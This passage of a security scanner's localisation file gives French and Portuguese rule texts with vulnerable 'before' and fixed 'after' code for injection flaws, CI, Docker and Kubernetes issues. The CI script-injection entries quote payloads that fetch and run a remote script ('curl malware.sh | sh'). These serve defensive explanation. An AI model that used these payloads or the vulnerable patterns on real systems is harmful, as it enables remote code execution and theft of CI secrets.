      'Une ligne qui construit un filtre LDAP (ex. "(uid=...)") inclut directement une valeur prise dans la requête, sans aucun échappement des caractères spéciaux LDAP. Celui qui contrôle cette valeur peut altérer la logique du filtre — par exemple contourner une vérification d\'authentification ou lire des données de l\'annuaire qu\'il ne devrait pas voir.',
    fix: {
      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // les caractères spéciaux LDAP doivent toujours être échappés avant de les utiliser dans un filtre\nclient.search(base, { filter });`,
    },
  },
  "header-injection": {
    title: "Une valeur de la requête se retrouve directement dans un en-tête de réponse HTTP",
    description:
      "Un en-tête de réponse HTTP est défini avec une valeur prise directement dans la requête (query, body, params), sans vérifier qu'elle ne contient pas de retour à la ligne (CRLF). Un attaquant peut insérer des en-têtes supplémentaires ou même une réponse entièrement différente — response splitting — pouvant manipuler le cache, les cookies ou le contenu affiché à d'autres utilisateurs.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "gha-unpinned-action": {
    title: "Une action tierce dans la CI n'est pas verrouillée sur une version précise (commit SHA)",
    description:
      'Le workflow utilise une action tierce référencée par tag ou branche (ex. "@v1", "@main") au lieu d\'un commit SHA. Celui qui la maintient — ou celui qui compromet son compte — peut déplacer cette référence vers un commit différent à tout moment, changeant silencieusement ce qui s\'exécute dans la CI, avec accès à ses secrets. Un commit SHA pointe toujours vers exactement le même code.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, verrouillée sur le commit SHA — mettez à jour le SHA quand vous mettez à jour la version`,
    },
  },
  "gha-excessive-permissions": {
    title: "Le workflow s'accorde toutes les permissions du token au lieu de seulement celles qu'il utilise",
    description:
      '"permissions: write-all" accorde au GITHUB_TOKEN du workflow un accès en écriture à tout — issues, pull requests, packages, déploiements — même si le workflow n\'en utilise qu\'une partie. Si une étape du workflow est compromise (une dépendance malveillante, un script injecté), ces permissions plus larges augmentent ce que celui qui l\'exploite peut faire.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # seulement les permissions réellement utilisées par le workflow`,
    },
  },
  "insecure-cookie-flags": {
    title: "Un cookie de session ou d'authentification est défini sans les flags Secure et HttpOnly",
    description:
      'Un cookie avec un nom ressemblant à session/auth/token est défini sans "httpOnly" ni "secure" parmi ses options. Sans httpOnly, le JavaScript de la page — y compris du code injecté via XSS — peut lire ce cookie. Sans secure, il peut aussi être envoyé sur une connexion HTTP non chiffrée.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Un secret est écrit directement dans une instruction ENV ou ARG du Dockerfile",
    description:
      "Une variable avec un nom du type password/secret/token/key a une valeur littérale dans une instruction ENV ou ARG. Contrairement à un fichier .env (qui ne se retrouve normalement pas dans l'image), cette valeur est gravée dans l'image Docker elle-même — quiconque peut la récupérer (pull) ou inspecter l'historique des layers peut la retrouver, même si la ligne est supprimée dans une version ultérieure du Dockerfile.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# passé avec : docker build --build-arg DB_PASSWORD=*** (ou, mieux encore,\n# un montage de secret BuildKit, qui ne se retrouve jamais dans l'historique des layers)`,
    },
  },
  "docker-missing-user": {
    title: "Le Dockerfile ne définit pas d'utilisateur non-root",
    description:
      "Aucune instruction USER dans le Dockerfile : sans cela, le conteneur s'exécute en tant que root. Si un attaquant parvient à exécuter du code dans le conteneur (ex. en exploitant une bibliothèque vulnérable), être root dans le conteneur facilite une évasion vers l'hôte — ou un impact plus large sur le système environnant.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'L\'image de base du Dockerfile utilise le tag ":latest"',
    description:
      'Une instruction FROM utilise explicitement le tag ":latest" au lieu d\'une version précise. "latest" change avec le temps : le même build, refait à un autre moment, peut obtenir une version différente de l\'image de base — un build non reproductible, et une mise à jour non désirée peut arriver sans que personne ait décidé qu\'elle devait avoir lieu.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Le Dockerfile télécharge un fichier distant avec ADD au lieu de COPY",
    description:
      "Une instruction ADD avec une URL http/https télécharge un fichier depuis internet pendant le build, sans aucune vérification d'intégrité et avec un contenu invisible dans le dépôt. Si cette URL est un jour compromise, le build récupère un contenu arbitraire sans que personne ne le remarque en lisant simplement le Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<hash attendu>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-privileged-container": {
    title: "Un conteneur du manifeste Kubernetes s'exécute en mode privilégié",
    description:
      '"privileged: true" dans le securityContext d\'un conteneur désactive presque toute l\'isolation habituelle entre le conteneur et l\'hôte : le conteneur peut accéder aux périphériques de l\'hôte, modifier sa configuration réseau, et dans de nombreux cas obtenir de fait un accès root à la machine qui l\'exécute. Presque jamais nécessaire pour une application normale.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # seulement les capabilities réellement nécessaires`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Un secret est écrit en clair dans une variable d'environnement d'un manifeste Kubernetes",
    description:
      'Une variable d\'environnement avec un nom du type password/secret/token/key a une valeur littérale ("value:") au lieu d\'être lue depuis un Secret ("valueFrom.secretKeyRef"). Le manifeste lui-même — souvent committé dans un dépôt — contient donc le secret en clair, visible même par quelqu\'un qui ne peut que lire la configuration, sans nécessairement exécuter des commandes dans le cluster.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "k8s-run-as-root": {
    title: "Un conteneur du manifeste Kubernetes est configuré pour s'exécuter en tant que root",
    description:
      '"runAsUser: 0" ou "runAsNonRoot: false" dans le securityContext forcent explicitement le conteneur à s\'exécuter en tant que root. Si un attaquant parvient à exécuter du code dans le conteneur (ex. en exploitant une bibliothèque vulnérable), être root dans le conteneur facilite une évasion vers l\'hôte — ou un impact plus large.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Un conteneur du manifeste Kubernetes peut obtenir plus de privilèges qu'il n'en avait au démarrage",
    description:
      '"allowPrivilegeEscalation: true" dans le securityContext permet à un processus dans le conteneur d\'obtenir plus de privilèges que le processus qui l\'a démarré (ex. via un binaire setuid). Combiné à une vulnérabilité dans l\'application, c\'est un pas de plus vers l\'exécution de code avec plus de privilèges que prévu.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Un pod du manifeste Kubernetes partage le réseau, les processus ou la mémoire partagée de l'hôte",
    description:
      '"hostNetwork", "hostPID" ou "hostIPC" réglés sur true sortent le pod de son isolation normale : hostNetwork expose le pod sur le réseau de l\'hôte (contournant les network policies du cluster), hostPID lui donne une visibilité sur tous les processus de la machine hôte, hostIPC lui donne accès à la mémoire partagée de l\'hôte. Presque jamais nécessaire pour une application normale — généralement réservé aux outils système/monitoring de bas niveau.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Le manifeste Kubernetes n'impose pas explicitement l'exécution avec un utilisateur non-root",
    description:
      'Aucun "runAsNonRoot" nulle part dans le manifeste (ni au niveau du pod ni du conteneur) : sans le définir, un conteneur s\'exécute avec l\'utilisateur défini par son image — souvent root par défaut, si l\'image elle-même n\'a pas changé cela. Le définir explicitement à true empêche le pod de démarrer si l\'image essaie encore de s\'exécuter en tant que root, au lieu de le découvrir seulement après un incident.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Dépendance vulnérable :"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Aucune version corrigée connue pour le moment — envisagez un package alternatif ou suivez les mises à jour du projet."
      ),
    },
  }),
    "gitlab-ci-script-injection": {
      title: 'Une valeur contrôlée par un utilisateur externe passe par un second shell dans le pipeline GitLab CI',
      description: 'Une ligne "script:" (ou "before_script:"/"after_script:") utilise "eval" ou "sh -c"/"bash -c" avec une variable prédéfinie de GitLab comme le titre de la merge request, le message de commit ou le nom de la branche — toutes modifiables par quiconque ouvre une merge request, même depuis un fork externe. La valeur est d\'abord développée par le shell externe, puis collée dans une chaîne que le second shell interprète à nouveau comme du code : un titre du type "$(curl malware.sh | sh)" exécuterait des commandes arbitraires dans le pipeline, avec accès à tous les secrets disponibles dans ce job.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # passé comme argument à la commande, jamais dans une chaîne "bash -c" qui le réinterpréterait`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker dans le pipeline GitLab CI tourne avec le chiffrement TLS désactivé',
      description: 'Le job utilise le service "docker:dind" (Docker-in-Docker, nécessaire pour construire des images dans le pipeline) mais définit "DOCKER_TLS_CERTDIR" sur une chaîne vide, désactivant entièrement le chiffrement TLS entre le client Docker et le démon dind. Sans TLS, quiconque peut atteindre ce port sur le même réseau interne du runner peut contrôler le démon Docker — qui tourne avec des privilèges étendus — au lieu de se limiter au job censé l\'utiliser.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # TLS actif entre le client Docker et le démon dind — "" le désactive entièrement`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'L\'image Docker du pipeline GitLab CI n\'est pas figée à une version précise',
      description: 'Un "image:" du pipeline pointe vers une image sans tag (équivalent à ":latest") ou explicitement vers ":latest". Quiconque maintient cette image peut en remplacer le contenu à tout moment sans que le dépôt ne change — le même pipeline peut se mettre à exécuter un code différent du jour au lendemain, un risque de supply chain conceptuellement identique à une GitHub Action référencée par tag plutôt que par commit.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # un tag précis (ou mieux encore un digest "node@sha256:...") plutôt que "latest"`,
      },
    },
},
  pt: {
  "supabase-service-role-in-client": {
    title: "A chave secreta do Supabase acaba numa parte pensada para o browser",
    description:
      "Uma variável com prefixo público (ex. NEXT_PUBLIC_, VITE_) ou um ficheiro do lado do cliente faz referência à service role key do Supabase. Esta chave contorna a Row Level Security: se acabar no bundle do browser, qualquer pessoa pode lê-la e agir como administrador da base de dados.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (apenas servidor)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Há palavras-passe ou chaves secretas escritas diretamente no código",
    description:
      "Uma chave de API, um token ou uma palavra-passe parecem estar escritos como um valor literal em vez de lidos a partir de uma variável de ambiente. Quem ler o código-fonte (ou o repositório, se público) obtém esse segredo.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Um ficheiro com as palavras-passe reais do projeto está entre os analisados",
    description:
      "Um ficheiro .env com valores reais (não um .env.example) está incluído na análise. Se este ficheiro acabar num repositório ou num deploy público, todas as credenciais que contém ficam expostas.",
    fix: {
      before: `# .env (submetido por engano)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (submetido)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env fica fora do repositório (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Qualquer pessoa pode ler ou alterar os dados de todos os utilizadores",
    description:
      "A Row Level Security está desativada, ou uma política permite o acesso a qualquer pessoa (USING (true)) sem verificar quem está a fazer o pedido. Qualquer utilizador autenticado — ou até anónimo — pode ler ou alterar os dados de todos os outros.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Um valor introduzido pelo utilizador é colado diretamente numa query à base de dados",
    description:
      "Uma query SQL é construída concatenando ou interpolando uma string diretamente em vez de usar parâmetros. Se esse texto vier (mesmo que indiretamente) de um utilizador, pode alterar a própria query — SQL injection.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "As palavras-passe não parecem estar protegidas",
    description:
      "Um campo de palavra-passe é guardado exatamente como chegou no pedido, e nenhuma função de hashing (bcrypt, argon2, scrypt) aparece no ficheiro. Se a base de dados for comprometida, todas as palavras-passe ficam imediatamente utilizáveis.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "O segredo usado para assinar os logins está escrito em texto simples no código",
    description:
      "O segredo passado a jwt.sign / jwt.verify (ou a variável JWT_SECRET) é um valor literal no código em vez de vir de uma variável de ambiente. Quem o ler pode criar tokens de acesso válidos para qualquer utilizador.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "O servidor pode ser forçado a executar comandos externos",
    description:
      "Uma função que executa comandos do sistema (exec, execSync, spawn) recebe uma string construída por interpolação ou concatenação. Se parte dessa string vier de input do utilizador, quem a controla pode executar comandos arbitrários no servidor.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "Um ficheiro no servidor pode ser lido ou escrito escolhendo o caminho a partir do exterior",
    description:
      "Uma função que lê, escreve ou envia um ficheiro recebe o caminho diretamente de um valor do pedido (query, body, params) sem verificar que permanece dentro de uma pasta permitida. Um atacante pode inserir \"../\" para sair da pasta prevista e ler ou sobrescrever ficheiros arbitrários no servidor (ex. um ficheiro de configuração com credenciais).",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Caminho não permitido")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Um valor introduzido pelo utilizador é executado como código dentro de uma query MongoDB",
    description:
      "O operador $where do MongoDB executa JavaScript do lado do servidor para cada documento — se essa string for construída concatenando um valor que vem do utilizador, quem a controla pode fazer executar código arbitrário no contexto da base de dados, não só alterar o filtro como numa SQL injection normal.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Um valor introduzido pelo utilizador é interpretado como um template, não como dados",
    description:
      "Uma função que compila/executa um template recebe o TEMPLATE INTEIRO a partir de um valor do pedido, em vez de usar um template fixo e passar apenas os dados. Um atacante pode escrever diretamente na sintaxe do motor de templates (ex. {{7*7}} para Jinja2) e executar código no servidor — Server-Side Template Injection, que frequentemente leva à execução de comandos arbitrários, não apenas a um problema de visualização como o XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "O parser XML pode ser forçado a ler ficheiros ou a fazer pedidos externos",
    description:
      "Um parser XML (DocumentBuilderFactory) é criado sem desativar explicitamente as entidades externas (DOCTYPE), nas linhas próximas. Se o parser receber XML de uma fonte não fiável, um atacante pode definir uma entidade externa para ler ficheiros no servidor ou fazê-lo contactar um endereço à sua escolha — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Um segredo está escrito diretamente numa instrução ENV ou ARG no Dockerfile",
    description:
      "Uma variável com um nome como password/secret/token/key tem um valor literal numa instrução ENV ou ARG. Ao contrário de um ficheiro .env (que normalmente não acaba na imagem), este valor fica embutido na própria imagem Docker — quem a puder descarregar ou inspecionar o histórico de camadas consegue recuperá-lo, mesmo que a linha seja removida numa versão posterior do Dockerfile.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# passado com: docker build --build-arg DB_PASSWORD=*** (ou, melhor ainda,\n# um BuildKit secret mount, que nunca acaba no histórico de camadas)`,
    },
  },
  "k8s-privileged-container": {
    title: "Um contentor no manifesto Kubernetes corre como privilegiado",
    description:
      '"privileged: true" no securityContext de um contentor desativa quase todo o isolamento habitual entre contentor e anfitrião: o contentor pode aceder aos dispositivos do anfitrião, alterar a sua configuração de rede, e em muitos casos obter efetivamente acesso root à máquina onde corre. Quase nunca necessário para uma app normal.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # apenas as capabilities realmente necessárias`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Um segredo está escrito em texto simples numa variável de ambiente de um manifesto Kubernetes",
    description:
      'Uma variável de ambiente com um nome como password/secret/token/key tem um valor literal ("value:") em vez de ser lida de um Secret ("valueFrom.secretKeyRef"). O próprio manifesto — muitas vezes submetido a um repositório — contém assim o segredo em texto simples, visível mesmo para quem só pode ler a configuração, não necessariamente executar comandos no cluster.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "Um security group Terraform abre uma porta sensível a toda a internet",
    description:
      'Uma regra com "cidr_blocks" que inclui 0.0.0.0/0 (qualquer endereço IP) está próxima de uma porta sensível — SSH (22), RDP (3389), ou uma porta típica de base de dados (MySQL, Postgres, MongoDB, Redis, SQL Server). Qualquer pessoa na internet pode tentar ligar-se a esse serviço, não apenas quem deveria.',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # apenas a sua rede privada, ou um bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Uma regra de firewall da Google Cloud abre uma porta sensível a toda a internet",
    description:
      'Um recurso "google_compute_firewall" com "source_ranges" que inclui 0.0.0.0/0 (qualquer endereço IP) permite tráfego para uma porta sensível — SSH (22), RDP (3389), ou uma porta típica de base de dados (MySQL, Postgres, MongoDB, Redis, SQL Server). Qualquer pessoa na internet pode tentar ligar-se a esse serviço, não apenas quem deveria.',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # apenas a sua rede privada, ou um bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Uma regra de rede do Azure abre uma porta sensível a toda a internet",
    description:
      'Uma regra de segurança de rede ("azurerm_network_security_rule", ou um bloco "security_rule" dentro de "azurerm_network_security_group") com "source_address_prefix" definido como "*" ou "0.0.0.0/0", direção "Inbound" e acesso "Allow", próxima de uma porta sensível — SSH (22), RDP (3389), ou uma porta típica de base de dados. Qualquer pessoa na internet pode tentar ligar-se a esse serviço, não apenas quem deveria.',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # apenas a sua rede privada, ou um bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Um segredo está escrito como valor predefinido de uma variável Terraform",
    description:
      'Uma variável com um nome como password/secret/token/key tem um valor literal no seu "default". Ao contrário de um valor passado em tempo de execução (tfvars, variáveis de ambiente TF_VAR_*), um default acaba no código-fonte — e se o repositório for partilhado ou público, qualquer pessoa o vê, mesmo sem acesso ao estado do Terraform.',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # sem default: deve ser passada com um ficheiro .tfvars (fora do git) ou uma variável de ambiente TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Um valor controlado por um utilizador externo entra diretamente num comando shell da CI",
    description:
      'Um comando "run:" de um workflow do GitHub Actions interpola diretamente um valor como o título de uma pull request, o nome de um branch ou o texto de um comentário — tudo escrevível por quem abrir uma pull request ou comentário, mesmo a partir de um fork externo. Um valor como `"; curl malware.sh | sh #` executaria comandos arbitrários na CI, com acesso a todos os segredos disponíveis nesse workflow.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # passado como variável de ambiente, nunca interpolado diretamente no comando`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "O workflow executa o código de uma pull request externa com acesso aos segredos do repositório",
    description:
      'O workflow usa "pull_request_target" — que corre com as permissões e segredos do repositório base mesmo para uma pull request aberta a partir de um fork externo — e faz checkout do código da própria pull request ("github.event.pull_request.head"), não do branch base. Quem abre a pull request obtém, na prática, a execução do seu próprio código com acesso a esses segredos.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Faz checkout do branch base, não do código da PR — ou usa\n      # "pull_request" em vez de "pull_request_target" se não precisar\n      # das permissões/segredos mais amplos.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Dados do pedido são deserializados com um formato que pode executar código",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) ou a biblioteca node-serialize (Node) estão a deserializar um valor obtido diretamente do pedido. Ao contrário do JSON, estes formatos podem representar e executar código durante a própria deserialização — quem controla o valor enviado pode conseguir execução arbitrária de código no servidor.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # o JSON nunca executa código durante o parsing, ao contrário do pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'O código aceita explicitamente tokens JWT não assinados (algoritmo "none")',
    description:
      '"none" aparece entre os algoritmos aceites para verificar um token JWT. Um token com o algoritmo "none" não tem nenhuma assinatura para verificar: qualquer pessoa pode construir um com qualquer conteúdo (ex. uma função de administrador) e o código aceitá-lo-ia como válido.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // nunca incluir "none" entre os algoritmos aceites`,
    },
  },
  "unprotected-new-table": {
    title: "Parece estar a ser criada uma nova tabela sem proteção",
    description:
      "Uma migração SQL cria uma tabela mas não ativa a Row Level Security para essa mesma tabela no mesmo ficheiro. Enquanto se mantiver assim, a tabela começa sem nenhuma restrição sobre quem a pode ler ou escrever.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "O site aceita pedidos de qualquer outro site",
    description:
      "O cabeçalho CORS está definido para aceitar pedidos de qualquer origem (*), ou o middleware cors() é usado sem restrições. Qualquer site de terceiros pode chamar as suas APIs a partir do browser de um utilizador já autenticado.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Uma função com permissões de administrador não verifica quem a está a usar",
    description:
      "Uma rota ou função cujo nome sugere operações de administração não contém, nas linhas próximas, nenhuma verificação de autenticação ou de perfil. Qualquer pessoa que conheça o URL poderia executá-la.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "O site pode ser forçado a executar código externo",
    description:
      "Um pedido HTTP de saída (fetch, axios) usa diretamente um valor vindo do pedido de um utilizador como URL de destino. Um utilizador mal-intencionado pode fazer o seu servidor chamar endereços internos ou arbitrários — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL not allowed")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "As palavras-passe são protegidas com um método agora fácil de quebrar",
    description:
      "Na mesma linha, md5() ou sha1() são aplicados a um valor associado a uma palavra-passe. Estes algoritmos são rápidos demais de calcular: um atacante com a base de dados consegue tentar milhares de milhões de palavras-passe por segundo.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "Texto escrito por utilizadores pode executar código no browser",
    description:
      "O conteúdo é inserido na página como HTML em bruto (dangerouslySetInnerHTML, v-html, .innerHTML) em vez de como texto simples. Se esse conteúdo incluir input do utilizador, pode conter scripts que executam no browser de quem lê a página.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// ou, se for necessário HTML: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "O espaço para ficheiros carregados é visível por qualquer pessoa",
    description:
      "Um storage bucket (Supabase Storage, S3) está configurado como público. Se contiver documentos, fotos ou ficheiros carregados por utilizadores, qualquer pessoa que conheça — ou adivinhe — o caminho pode aceder-lhes sem autenticação.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// sirva os ficheiros com URLs assinados e com tempo limitado: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Um único link é suficiente para apagar ou alterar dados",
    description:
      "Uma rota GET executa uma operação que altera dados (o caminho contém delete/remove/update/edit). Os pedidos GET executam-se apenas ao visitar um link ou carregar uma imagem a partir de um site externo — o clássico ponto de partida para um ataque CSRF.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Os dados de login guardados no browser não estão bem protegidos",
    description:
      "Um token de acesso é guardado em localStorage. Ao contrário de uma cookie httpOnly, qualquer script a correr na página (incluindo um malicioso injetado via XSS) pode lê-lo e roubá-lo.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// defina o token como uma cookie httpOnly a partir do servidor:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "O site pode ser usado para redirecionar para um site fraudulento",
    description:
